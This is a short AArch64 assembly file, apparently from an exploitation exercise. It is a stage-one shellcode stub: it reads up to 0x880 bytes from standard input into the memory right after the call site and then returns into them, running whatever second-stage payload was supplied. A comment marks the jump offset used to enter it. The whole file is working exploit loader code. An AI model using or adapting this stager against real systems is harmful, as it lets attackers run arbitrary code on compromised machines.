.section .text
.global _start


main:
	// read(0, &nextstage, 0x880)

    eor x0, xzr, xzr
    eor x1, xzr, lr
    mov x2, #0x880

    mov x8, #0x3f // SYS_read

    svc #0x1337

    ret

	
// JUMP HERE (offset: 0x18 = 24)
_start:
	adr x10, main
	blr x10
    nextstage:
